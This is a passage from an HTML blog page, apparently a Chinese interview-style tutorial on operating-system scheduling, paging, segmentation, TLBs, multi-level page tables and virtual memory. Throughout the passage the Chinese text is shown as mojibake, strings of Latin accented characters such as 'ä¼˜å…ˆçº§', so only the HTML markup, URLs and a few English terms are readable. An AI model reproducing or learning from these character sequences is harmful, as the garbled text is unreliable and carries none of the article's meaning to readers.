<li><strong>ä¼˜å…ˆçº§è°ƒåº¦</strong> ï¼š ä¸ºæ¯ä¸ªæµç¨‹åˆ†é…ä¼˜å…ˆçº§ï¼Œé¦–å…ˆæ‰§è¡Œå…·æœ‰æœ€é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹ï¼Œä¾æ­¤ç±»æ¨ã€‚å…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„è¿›ç¨‹ä»¥ FCFS æ–¹å¼æ‰§è¡Œã€‚å¯ä»¥æ ¹æ®å†…å­˜è¦æ±‚ï¼Œæ—¶é—´è¦æ±‚æˆ–ä»»ä½•å…¶ä»–èµ„æºè¦æ±‚æ¥ç¡®å®šä¼˜å…ˆçº§ã€‚</li>
</ul>
<h2 id="æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†åŸºç¡€"><a href="#æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†åŸºç¡€" class="headerlink" title="æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†åŸºç¡€"></a>æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†åŸºç¡€</h2><h3 id="å†…å­˜ç®¡ç†ä»‹ç»"><a href="#å†…å­˜ç®¡ç†ä»‹ç»" class="headerlink" title="å†…å­˜ç®¡ç†ä»‹ç»"></a>å†…å­˜ç®¡ç†ä»‹ç»</h3><p>ğŸ‘¨â€ğŸ’» <strong>é¢è¯•å®˜</strong>: <strong>æ“ä½œç³»ç»Ÿçš„å†…å­˜ç®¡ç†ä¸»è¦æ˜¯åšä»€ä¹ˆï¼Ÿ</strong></p>
<p>ğŸ™‹ <strong>æˆ‘ï¼š</strong> æ“ä½œç³»ç»Ÿçš„å†…å­˜ç®¡ç†ä¸»è¦è´Ÿè´£å†…å­˜çš„åˆ†é…ä¸å›æ”¶ï¼ˆmalloc å‡½æ•°ï¼šç”³è¯·å†…å­˜ï¼Œfree å‡½æ•°ï¼šé‡Šæ”¾å†…å­˜ï¼‰ï¼Œå¦å¤–åœ°å€è½¬æ¢ä¹Ÿå°±æ˜¯å°†é€»è¾‘åœ°å€è½¬æ¢æˆç›¸åº”çš„ç‰©ç†åœ°å€ç­‰åŠŸèƒ½ä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†åšçš„äº‹æƒ…ã€‚</p>
<h3 id="å¸¸è§çš„å‡ ç§å†…å­˜ç®¡ç†æœºåˆ¶"><a href="#å¸¸è§çš„å‡ ç§å†…å­˜ç®¡ç†æœºåˆ¶" class="headerlink" title="å¸¸è§çš„å‡ ç§å†…å­˜ç®¡ç†æœºåˆ¶"></a>å¸¸è§çš„å‡ ç§å†…å­˜ç®¡ç†æœºåˆ¶</h3><p>ğŸ‘¨â€ğŸ’» <strong>é¢è¯•å®˜</strong>: <strong>æ“ä½œç³»ç»Ÿçš„å†…å­˜ç®¡ç†æœºåˆ¶äº†è§£å—ï¼Ÿå†…å­˜ç®¡ç†æœ‰å“ªå‡ ç§æ–¹å¼?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘ï¼š</strong> è¿™ä¸ªåœ¨å­¦ä¹ æ“ä½œç³»ç»Ÿçš„æ—¶å€™æœ‰äº†è§£è¿‡ã€‚</p>
<p>ç®€å•åˆ†ä¸º<strong>è¿ç»­åˆ†é…ç®¡ç†æ–¹å¼</strong>å’Œ<strong>éè¿ç»­åˆ†é…ç®¡ç†æ–¹å¼</strong>è¿™ä¸¤ç§ã€‚è¿ç»­åˆ†é…ç®¡ç†æ–¹å¼æ˜¯æŒ‡ä¸ºä¸€ä¸ªç”¨æˆ·ç¨‹åºåˆ†é…ä¸€ä¸ªè¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œå¸¸è§çš„å¦‚ <strong>å—å¼ç®¡ç†</strong> ã€‚åŒæ ·åœ°ï¼Œéè¿ç»­åˆ†é…ç®¡ç†æ–¹å¼å…è®¸ä¸€ä¸ªç¨‹åºä½¿ç”¨çš„å†…å­˜åˆ†å¸ƒåœ¨ç¦»æ•£æˆ–è€…è¯´ä¸ç›¸é‚»çš„å†…å­˜ä¸­ï¼Œå¸¸è§çš„å¦‚<strong>é¡µå¼ç®¡ç†</strong> å’Œ <strong>æ®µå¼ç®¡ç†</strong>ã€‚</p>
<ol>
<li><strong>å—å¼ç®¡ç†</strong> ï¼š è¿œå¤æ—¶ä»£çš„è®¡ç®—æœºæ“ç³»ç»Ÿçš„å†…å­˜ç®¡ç†æ–¹å¼ã€‚å°†å†…å­˜åˆ†ä¸ºå‡ ä¸ªå›ºå®šå¤§å°çš„å—ï¼Œæ¯ä¸ªå—ä¸­åªåŒ…å«ä¸€ä¸ªè¿›ç¨‹ã€‚å¦‚æœç¨‹åºè¿è¡Œéœ€è¦å†…å­˜çš„è¯ï¼Œæ“ä½œç³»ç»Ÿå°±åˆ†é…ç»™å®ƒä¸€å—ï¼Œå¦‚æœç¨‹åºè¿è¡Œåªéœ€è¦å¾ˆå°çš„ç©ºé—´çš„è¯ï¼Œåˆ†é…çš„è¿™å—å†…å­˜å¾ˆå¤§ä¸€éƒ¨åˆ†å‡ ä¹è¢«æµªè´¹äº†ã€‚è¿™äº›åœ¨æ¯ä¸ªå—ä¸­æœªè¢«åˆ©ç”¨çš„ç©ºé—´ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç¢ç‰‡ã€‚</li>
<li><strong>é¡µå¼ç®¡ç†</strong> ï¼šæŠŠä¸»å­˜åˆ†ä¸ºå¤§å°ç›¸ç­‰ä¸”å›ºå®šçš„ä¸€é¡µä¸€é¡µçš„å½¢å¼ï¼Œé¡µè¾ƒå°ï¼Œç›¸å¯¹ç›¸æ¯”äºå—å¼ç®¡ç†çš„åˆ’åˆ†åŠ›åº¦æ›´å¤§ï¼Œæé«˜äº†å†…å­˜åˆ©ç”¨ç‡ï¼Œå‡å°‘äº†ç¢ç‰‡ã€‚é¡µå¼ç®¡ç†é€šè¿‡é¡µè¡¨å¯¹åº”é€»è¾‘åœ°å€å’Œç‰©ç†åœ°å€ã€‚</li>
<li><strong>æ®µå¼ç®¡ç†</strong> ï¼š é¡µå¼ç®¡ç†è™½ç„¶æé«˜äº†å†…å­˜åˆ©ç”¨ç‡ï¼Œä½†æ˜¯é¡µå¼ç®¡ç†å…¶ä¸­çš„é¡µå®é™…å¹¶æ— ä»»ä½•å®é™…æ„ä¹‰ã€‚ æ®µå¼ç®¡ç†æŠŠä¸»å­˜åˆ†ä¸ºä¸€æ®µæ®µçš„ï¼Œæ¯ä¸€æ®µçš„ç©ºé—´åˆè¦æ¯”ä¸€é¡µçš„ç©ºé—´å°å¾ˆå¤š ã€‚ä½†æ˜¯ï¼Œæœ€é‡è¦çš„æ˜¯æ®µæ˜¯æœ‰å®é™…æ„ä¹‰çš„ï¼Œæ¯ä¸ªæ®µå®šä¹‰äº†ä¸€ç»„é€»è¾‘ä¿¡æ¯ï¼Œä¾‹å¦‚,æœ‰ä¸»ç¨‹åºæ®µ MAINã€å­ç¨‹åºæ®µ Xã€æ•°æ®æ®µ D åŠæ ˆæ®µ S ç­‰ã€‚ æ®µå¼ç®¡ç†é€šè¿‡æ®µè¡¨å¯¹åº”é€»è¾‘åœ°å€å’Œç‰©ç†åœ°å€ã€‚</li>
</ol>
<p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š å›ç­”çš„è¿˜ä¸é”™ï¼ä¸è¿‡æ¼æ‰äº†ä¸€ä¸ªå¾ˆé‡è¦çš„ <strong>æ®µé¡µå¼ç®¡ç†æœºåˆ¶</strong> ã€‚æ®µé¡µå¼ç®¡ç†æœºåˆ¶ç»“åˆäº†æ®µå¼ç®¡ç†å’Œé¡µå¼ç®¡ç†çš„ä¼˜ç‚¹ã€‚ç®€å•æ¥è¯´æ®µé¡µå¼ç®¡ç†æœºåˆ¶å°±æ˜¯æŠŠä¸»å­˜å…ˆåˆ†æˆè‹¥å¹²æ®µï¼Œæ¯ä¸ªæ®µåˆåˆ†æˆè‹¥å¹²é¡µï¼Œä¹Ÿå°±æ˜¯è¯´ <strong>æ®µé¡µå¼ç®¡ç†æœºåˆ¶</strong> ä¸­æ®µä¸æ®µä¹‹é—´ä»¥åŠæ®µçš„å†…éƒ¨çš„éƒ½æ˜¯ç¦»æ•£çš„ã€‚</p>
<h3 id="å¿«è¡¨å’Œå¤šçº§é¡µè¡¨"><a href="#å¿«è¡¨å’Œå¤šçº§é¡µè¡¨" class="headerlink" title="å¿«è¡¨å’Œå¤šçº§é¡µè¡¨"></a>å¿«è¡¨å’Œå¤šçº§é¡µè¡¨</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š é¡µè¡¨ç®¡ç†æœºåˆ¶ä¸­æœ‰ä¸¤ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µï¼šå¿«è¡¨å’Œå¤šçº§é¡µè¡¨ï¼Œè¿™ä¸¤ä¸ªä¸œè¥¿åˆ†åˆ«è§£å†³äº†é¡µè¡¨ç®¡ç†ä¸­å¾ˆé‡è¦çš„ä¸¤ä¸ªé—®é¢˜ã€‚ä½ ç»™æˆ‘ç®€å•ä»‹ç»ä¸€ä¸‹å§ï¼</p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šåœ¨åˆ†é¡µå†…å­˜ç®¡ç†ä¸­ï¼Œå¾ˆé‡è¦çš„ä¸¤ç‚¹æ˜¯ï¼š</p>
<ol>
<li>è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢è¦å¿«ã€‚</li>
<li>è§£å†³è™šæ‹Ÿåœ°å€ç©ºé—´å¤§ï¼Œé¡µè¡¨ä¹Ÿä¼šå¾ˆå¤§çš„é—®é¢˜ã€‚</li>
</ol>
<h4 id="å¿«è¡¨"><a href="#å¿«è¡¨" class="headerlink" title="å¿«è¡¨"></a>å¿«è¡¨</h4><p>ä¸ºäº†è§£å†³è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢é€Ÿåº¦ï¼Œæ“ä½œç³»ç»Ÿåœ¨ <strong>é¡µè¡¨æ–¹æ¡ˆ</strong> åŸºç¡€ä¹‹ä¸Šå¼•å…¥äº† <strong>å¿«è¡¨</strong> æ¥åŠ é€Ÿè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢ã€‚æˆ‘ä»¬å¯ä»¥æŠŠå¿«è¡¨ç†è§£ä¸ºä¸€ç§ç‰¹æ®Šçš„é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨ï¼ˆCacheï¼‰ï¼Œå…¶ä¸­çš„å†…å®¹æ˜¯é¡µè¡¨çš„ä¸€éƒ¨åˆ†æˆ–è€…å…¨éƒ¨å†…å®¹ã€‚ä½œä¸ºé¡µè¡¨çš„ Cacheï¼Œå®ƒçš„ä½œç”¨ä¸é¡µè¡¨ç›¸ä¼¼ï¼Œä½†æ˜¯æé«˜äº†è®¿é—®é€Ÿç‡ã€‚ç”±äºé‡‡ç”¨é¡µè¡¨åšåœ°å€è½¬æ¢ï¼Œè¯»å†™å†…å­˜æ•°æ®æ—¶ CPU è¦è®¿é—®ä¸¤æ¬¡ä¸»å­˜ã€‚æœ‰äº†å¿«è¡¨ï¼Œæœ‰æ—¶åªè¦è®¿é—®ä¸€æ¬¡é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨ï¼Œä¸€æ¬¡ä¸»å­˜ï¼Œè¿™æ ·å¯åŠ é€ŸæŸ¥æ‰¾å¹¶æé«˜æŒ‡ä»¤æ‰§è¡Œé€Ÿåº¦ã€‚</p>
<p>ä½¿ç”¨å¿«è¡¨ä¹‹åçš„åœ°å€è½¬æ¢æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>æ ¹æ®è™šæ‹Ÿåœ°å€ä¸­çš„é¡µå·æŸ¥å¿«è¡¨ï¼›</li>
<li>å¦‚æœè¯¥é¡µåœ¨å¿«è¡¨ä¸­ï¼Œç›´æ¥ä»å¿«è¡¨ä¸­è¯»å–ç›¸åº”çš„ç‰©ç†åœ°å€ï¼›</li>
<li>å¦‚æœè¯¥é¡µä¸åœ¨å¿«è¡¨ä¸­ï¼Œå°±è®¿é—®å†…å­˜ä¸­çš„é¡µè¡¨ï¼Œå†ä»é¡µè¡¨ä¸­å¾—åˆ°ç‰©ç†åœ°å€ï¼ŒåŒæ—¶å°†é¡µè¡¨ä¸­çš„è¯¥æ˜ å°„è¡¨é¡¹æ·»åŠ åˆ°å¿«è¡¨ä¸­ï¼›</li>
<li>å½“å¿«è¡¨å¡«æ»¡åï¼Œåˆè¦ç™»è®°æ–°é¡µæ—¶ï¼Œå°±æŒ‰ç…§ä¸€å®šçš„æ·˜æ±°ç­–ç•¥æ·˜æ±°æ‰å¿«è¡¨ä¸­çš„ä¸€ä¸ªé¡µã€‚</li>
</ol>
<p>çœ‹å®Œäº†ä¹‹åä½ ä¼šå‘ç°å¿«è¡¨å’Œæˆ‘ä»¬å¹³æ—¶ç»å¸¸åœ¨æˆ‘ä»¬å¼€å‘çš„ç³»ç»Ÿä½¿ç”¨çš„ç¼“å­˜ï¼ˆæ¯”å¦‚ Redisï¼‰å¾ˆåƒï¼Œçš„ç¡®æ˜¯è¿™æ ·çš„ï¼Œæ“ä½œç³»ç»Ÿä¸­çš„å¾ˆå¤šæ€æƒ³ã€å¾ˆå¤šç»å…¸çš„ç®—æ³•ï¼Œä½ éƒ½å¯ä»¥åœ¨æˆ‘ä»¬æ—¥å¸¸å¼€å‘ä½¿ç”¨çš„å„ç§å·¥å…·æˆ–è€…æ¡†æ¶ä¸­æ‰¾åˆ°å®ƒä»¬çš„å½±å­ã€‚</p>
<h4 id="å¤šçº§é¡µè¡¨"><a href="#å¤šçº§é¡µè¡¨" class="headerlink" title="å¤šçº§é¡µè¡¨"></a>å¤šçº§é¡µè¡¨</h4><p>å¼•å…¥å¤šçº§é¡µè¡¨çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é¿å…æŠŠå…¨éƒ¨é¡µè¡¨ä¸€ç›´æ”¾åœ¨å†…å­˜ä¸­å ç”¨è¿‡å¤šç©ºé—´ï¼Œç‰¹åˆ«æ˜¯é‚£äº›æ ¹æœ¬å°±ä¸éœ€è¦çš„é¡µè¡¨å°±ä¸éœ€è¦ä¿ç•™åœ¨å†…å­˜ä¸­ã€‚å¤šçº§é¡µè¡¨å±äºæ—¶é—´æ¢ç©ºé—´çš„å…¸å‹åœºæ™¯ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹ä¸‹é¢è¿™ç¯‡æ–‡ç« </p>
<ul>
<li>å¤šçº§é¡µè¡¨å¦‚ä½•èŠ‚çº¦å†…å­˜ï¼š<a href="https://www.polarxiong.com/archives/%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8%E5%A6%82%E4%BD%95%E8%8A%82%E7%BA%A6%E5%86%85%E5%AD%98.html">https://www.polarxiong.com/archives/å¤šçº§é¡µè¡¨å¦‚ä½•èŠ‚çº¦å†…å­˜.html</a></li>
</ul>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>ä¸ºäº†æé«˜å†…å­˜çš„ç©ºé—´æ€§èƒ½ï¼Œæå‡ºäº†å¤šçº§é¡µè¡¨çš„æ¦‚å¿µï¼›ä½†æ˜¯æåˆ°ç©ºé—´æ€§èƒ½æ˜¯ä»¥æµªè´¹æ—¶é—´æ€§èƒ½ä¸ºåŸºç¡€çš„ï¼Œå› æ­¤ä¸ºäº†è¡¥å……æŸå¤±çš„æ—¶é—´æ€§èƒ½ï¼Œæå‡ºäº†å¿«è¡¨ï¼ˆå³ TLBï¼‰çš„æ¦‚å¿µã€‚ ä¸è®ºæ˜¯å¿«è¡¨è¿˜æ˜¯å¤šçº§é¡µè¡¨å®é™…ä¸Šéƒ½åˆ©ç”¨åˆ°äº†ç¨‹åºçš„å±€éƒ¨æ€§åŸç†</p>
<h3 id="åˆ†é¡µæœºåˆ¶å’Œåˆ†æ®µæœºåˆ¶çš„å…±åŒç‚¹å’ŒåŒºåˆ«"><a href="#åˆ†é¡µæœºåˆ¶å’Œåˆ†æ®µæœºåˆ¶çš„å…±åŒç‚¹å’ŒåŒºåˆ«" class="headerlink" title="åˆ†é¡µæœºåˆ¶å’Œåˆ†æ®µæœºåˆ¶çš„å…±åŒç‚¹å’ŒåŒºåˆ«"></a>åˆ†é¡µæœºåˆ¶å’Œåˆ†æ®µæœºåˆ¶çš„å…±åŒç‚¹å’ŒåŒºåˆ«</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼š <strong>åˆ†é¡µæœºåˆ¶å’Œåˆ†æ®µæœºåˆ¶æœ‰å“ªäº›å…±åŒç‚¹å’ŒåŒºåˆ«å‘¢ï¼Ÿ</strong></p>
<ol>
<li>å…±åŒç‚¹<ul>
<li>åˆ†é¡µæœºåˆ¶å’Œåˆ†æ®µæœºåˆ¶éƒ½æ˜¯ä¸ºäº†æé«˜å†…å­˜åˆ©ç”¨ç‡ï¼Œè¾ƒå°‘å†…å­˜ç¢ç‰‡ã€‚</li>
<li>é¡µå’Œæ®µéƒ½æ˜¯ç¦»æ•£å­˜å‚¨çš„ï¼Œæ‰€ä»¥ä¸¤è€…éƒ½æ˜¯ç¦»æ•£åˆ†é…å†…å­˜çš„æ–¹å¼ã€‚ä½†æ˜¯ï¼Œæ¯ä¸ªé¡µå’Œæ®µä¸­çš„å†…å­˜æ˜¯è¿ç»­çš„ã€‚</li>
</ul>
</li>
<li>åŒºåˆ«<ul>
<li>é¡µçš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šï¼›è€Œæ®µçš„å¤§å°ä¸å›ºå®šï¼Œå–å†³äºæˆ‘ä»¬å½“å‰è¿è¡Œçš„ç¨‹åºã€‚</li>
<li>åˆ†é¡µä»…ä»…æ˜¯ä¸ºäº†æ»¡è¶³æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†çš„éœ€æ±‚ï¼Œè€Œæ®µæ˜¯é€»è¾‘ä¿¡æ¯çš„å•ä½ï¼Œåœ¨ç¨‹åºä¸­å¯ä»¥ä½“ç°ä¸ºä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œèƒ½å¤Ÿæ›´å¥½æ»¡è¶³ç”¨æˆ·çš„éœ€è¦ã€‚</li>
</ul>
</li>
</ol>
<h3 id="é€»è¾‘-è™šæ‹Ÿ-åœ°å€å’Œç‰©ç†åœ°å€"><a href="#é€»è¾‘-è™šæ‹Ÿ-åœ°å€å’Œç‰©ç†åœ°å€" class="headerlink" title="é€»è¾‘(è™šæ‹Ÿ)åœ°å€å’Œç‰©ç†åœ°å€"></a>é€»è¾‘(è™šæ‹Ÿ)åœ°å€å’Œç‰©ç†åœ°å€</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼šä½ åˆšåˆšè¿˜æåˆ°äº†<strong>é€»è¾‘åœ°å€å’Œç‰©ç†åœ°å€</strong>è¿™ä¸¤ä¸ªæ¦‚å¿µï¼Œæˆ‘ä¸å¤ªæ¸…æ¥šï¼Œä½ èƒ½ä¸ºæˆ‘è§£é‡Šä¸€ä¸‹ä¸ï¼Ÿ</p>
<p>ğŸ™‹ <strong>æˆ‘ï¼š</strong> emâ€¦å¥½çš„å˜›ï¼æˆ‘ä»¬ç¼–ç¨‹ä¸€èˆ¬åªæœ‰å¯èƒ½å’Œé€»è¾‘åœ°å€æ‰“äº¤é“ï¼Œæ¯”å¦‚åœ¨ C è¯­è¨€ä¸­ï¼ŒæŒ‡é’ˆé‡Œé¢å­˜å‚¨çš„æ•°å€¼å°±å¯ä»¥ç†è§£æˆä¸ºå†…å­˜é‡Œçš„ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„é€»è¾‘åœ°å€ï¼Œé€»è¾‘åœ°å€ç”±æ“ä½œç³»ç»Ÿå†³å®šã€‚ç‰©ç†åœ°å€æŒ‡çš„æ˜¯çœŸå®ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ï¼Œæ›´å…·ä½“ä¸€ç‚¹æ¥è¯´å°±æ˜¯å†…å­˜åœ°å€å¯„å­˜å™¨ä¸­çš„åœ°å€ã€‚ç‰©ç†åœ°å€æ˜¯å†…å­˜å•å…ƒçœŸæ­£çš„åœ°å€ã€‚</p>
<h3 id="CPU-å¯»å€äº†è§£å—-ä¸ºä»€ä¹ˆéœ€è¦è™šæ‹Ÿåœ°å€ç©ºé—´"><a href="#CPU-å¯»å€äº†è§£å—-ä¸ºä»€ä¹ˆéœ€è¦è™šæ‹Ÿåœ°å€ç©ºé—´" class="headerlink" title="CPU å¯»å€äº†è§£å—?ä¸ºä»€ä¹ˆéœ€è¦è™šæ‹Ÿåœ°å€ç©ºé—´?"></a>CPU å¯»å€äº†è§£å—?ä¸ºä»€ä¹ˆéœ€è¦è™šæ‹Ÿåœ°å€ç©ºé—´?</h3><p>ç°ä»£å¤„ç†å™¨ä½¿ç”¨çš„æ˜¯ä¸€ç§ç§°ä¸º <strong>è™šæ‹Ÿå¯»å€(Virtual Addressing)</strong> çš„å¯»å€æ–¹å¼ã€‚<strong>ä½¿ç”¨è™šæ‹Ÿå¯»å€ï¼ŒCPU éœ€è¦å°†è™šæ‹Ÿåœ°å€ç¿»è¯‘æˆç‰©ç†åœ°å€ï¼Œè¿™æ ·æ‰èƒ½è®¿é—®åˆ°çœŸå®çš„ç‰©ç†å†…å­˜ã€‚</strong> å®é™…ä¸Šå®Œæˆè™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€è½¬æ¢çš„ç¡¬ä»¶æ˜¯ CPU ä¸­å«æœ‰ä¸€ä¸ªè¢«ç§°ä¸º <strong>å†…å­˜ç®¡ç†å•å…ƒï¼ˆMemory Management Unit, MMUï¼‰</strong> çš„ç¡¬ä»¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848062.png" alt="MMU_principle_updated"></p>
<p><strong>ä¸ºä»€ä¹ˆè¦æœ‰è™šæ‹Ÿåœ°å€ç©ºé—´å‘¢ï¼Ÿ</strong></p>
<p>å…ˆä»æ²¡æœ‰è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ—¶å€™è¯´èµ·å§ï¼æ²¡æœ‰è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ—¶å€™ï¼Œ<strong>ç¨‹åºéƒ½æ˜¯ç›´æ¥è®¿é—®å’Œæ“ä½œçš„éƒ½æ˜¯ç‰©ç†å†…å­˜</strong> ã€‚ä½†æ˜¯è¿™æ ·æœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p>
<ol>
<li>ç”¨æˆ·ç¨‹åºå¯ä»¥è®¿é—®ä»»æ„å†…å­˜ï¼Œå¯»å€å†…å­˜çš„æ¯ä¸ªå­—èŠ‚ï¼Œè¿™æ ·å°±å¾ˆå®¹æ˜“ï¼ˆæœ‰æ„æˆ–è€…æ— æ„ï¼‰ç ´åæ“ä½œç³»ç»Ÿï¼Œé€ æˆæ“ä½œç³»ç»Ÿå´©æºƒã€‚</li>
<li>æƒ³è¦åŒæ—¶è¿è¡Œå¤šä¸ªç¨‹åºç‰¹åˆ«å›°éš¾ï¼Œæ¯”å¦‚ä½ æƒ³åŒæ—¶è¿è¡Œä¸€ä¸ªå¾®ä¿¡å’Œä¸€ä¸ª QQ éŸ³ä¹éƒ½ä¸è¡Œã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼šå¾®ä¿¡åœ¨è¿è¡Œçš„æ—¶å€™ç»™å†…å­˜åœ°å€ 1xxx èµ‹å€¼åï¼ŒQQ éŸ³ä¹ä¹ŸåŒæ ·ç»™å†…å­˜åœ°å€ 1xxx èµ‹å€¼ï¼Œé‚£ä¹ˆ QQ éŸ³ä¹å¯¹å†…å­˜çš„èµ‹å€¼å°±ä¼šè¦†ç›–å¾®ä¿¡ä¹‹å‰æ‰€èµ‹çš„å€¼ï¼Œè¿™å°±é€ æˆäº†å¾®ä¿¡è¿™ä¸ªç¨‹åºå°±ä¼šå´©æºƒã€‚</li>
</ol>
<p><strong>æ€»ç»“æ¥è¯´ï¼šå¦‚æœç›´æ¥æŠŠç‰©ç†åœ°å€æš´éœ²å‡ºæ¥çš„è¯ä¼šå¸¦æ¥ä¸¥é‡é—®é¢˜ï¼Œæ¯”å¦‚å¯èƒ½å¯¹æ“ä½œç³»ç»Ÿé€ æˆä¼¤å®³ä»¥åŠç»™åŒæ—¶è¿è¡Œå¤šä¸ªç¨‹åºé€ æˆå›°éš¾ã€‚</strong></p>
<p>é€šè¿‡è™šæ‹Ÿåœ°å€è®¿é—®å†…å­˜æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ul>
<li>ç¨‹åºå¯ä»¥ä½¿ç”¨ä¸€ç³»åˆ—ç›¸é‚»çš„è™šæ‹Ÿåœ°å€æ¥è®¿é—®ç‰©ç†å†…å­˜ä¸­ä¸ç›¸é‚»çš„å¤§å†…å­˜ç¼“å†²åŒºã€‚</li>
<li>ç¨‹åºå¯ä»¥ä½¿ç”¨ä¸€ç³»åˆ—è™šæ‹Ÿåœ°å€æ¥è®¿é—®å¤§äºå¯ç”¨ç‰©ç†å†…å­˜çš„å†…å­˜ç¼“å†²åŒºã€‚å½“ç‰©ç†å†…å­˜çš„ä¾›åº”é‡å˜å°æ—¶ï¼Œå†…å­˜ç®¡ç†å™¨ä¼šå°†ç‰©ç†å†…å­˜é¡µï¼ˆé€šå¸¸å¤§å°ä¸º 4 KBï¼‰ä¿å­˜åˆ°ç£ç›˜æ–‡ä»¶ã€‚æ•°æ®æˆ–ä»£ç é¡µä¼šæ ¹æ®éœ€è¦åœ¨ç‰©ç†å†…å­˜ä¸ç£ç›˜ä¹‹é—´ç§»åŠ¨ã€‚</li>
<li>ä¸åŒè¿›ç¨‹ä½¿ç”¨çš„è™šæ‹Ÿåœ°å€å½¼æ­¤éš”ç¦»ã€‚ä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä»£ç æ— æ³•æ›´æ”¹æ­£åœ¨ç”±å¦ä¸€è¿›ç¨‹æˆ–æ“ä½œç³»ç»Ÿä½¿ç”¨çš„ç‰©ç†å†…å­˜ã€‚</li>
</ul>
<h2 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h2><h3 id="ä»€ä¹ˆæ˜¯è™šæ‹Ÿå†…å­˜-Virtual-Memory"><a href="#ä»€ä¹ˆæ˜¯è™šæ‹Ÿå†…å­˜-Virtual-Memory" class="headerlink" title="ä»€ä¹ˆæ˜¯è™šæ‹Ÿå†…å­˜(Virtual Memory)?"></a>ä»€ä¹ˆæ˜¯è™šæ‹Ÿå†…å­˜(Virtual Memory)?</h3><p>ğŸ‘¨â€ğŸ’»<strong>é¢è¯•å®˜</strong> ï¼šå†é—®ä½ ä¸€ä¸ªå¸¸è¯†æ€§çš„é—®é¢˜ï¼<strong>ä»€ä¹ˆæ˜¯è™šæ‹Ÿå†…å­˜(Virtual Memory)?</strong></p>
<p>ğŸ™‹ <strong>æˆ‘</strong> ï¼šè¿™ä¸ªåœ¨æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨ç”µè„‘ç‰¹åˆ«æ˜¯ Windows ç³»ç»Ÿçš„æ—¶å€™å¤ªå¸¸è§äº†ã€‚å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä½¿ç”¨ç‚¹å¼€äº†å¾ˆå¤šå å†…å­˜çš„è½¯ä»¶ï¼Œè¿™äº›è½¯ä»¶å ç”¨çš„å†…å­˜å¯èƒ½å·²ç»è¿œè¿œè¶…å‡ºäº†æˆ‘ä»¬ç”µè„‘æœ¬èº«å…·æœ‰çš„ç‰©ç†å†…å­˜ã€‚<strong>ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å‘¢ï¼Ÿ</strong> æ­£æ˜¯å› ä¸º <strong>è™šæ‹Ÿå†…å­˜</strong> çš„å­˜åœ¨ï¼Œé€šè¿‡ <strong>è™šæ‹Ÿå†…å­˜</strong> å¯ä»¥è®©ç¨‹åºå¯ä»¥æ‹¥æœ‰è¶…è¿‡ç³»ç»Ÿç‰©ç†å†…å­˜å¤§å°çš„å¯ç”¨å†…å­˜ç©ºé—´ã€‚å¦å¤–ï¼Œ<strong>è™šæ‹Ÿå†…å­˜ä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›äº†ä¸€ä¸ªä¸€è‡´çš„ã€ç§æœ‰çš„åœ°å€ç©ºé—´ï¼Œå®ƒè®©æ¯ä¸ªè¿›ç¨‹äº§ç”Ÿäº†ä¸€ç§è‡ªå·±åœ¨ç‹¬äº«ä¸»å­˜çš„é”™è§‰ï¼ˆæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ä¸€ç‰‡è¿ç»­å®Œæ•´çš„å†…å­˜ç©ºé—´ï¼‰</strong>ã€‚è¿™æ ·ä¼šæ›´åŠ æœ‰æ•ˆåœ°ç®¡ç†å†…å­˜å¹¶å‡å°‘å‡ºé”™ã€‚</p>
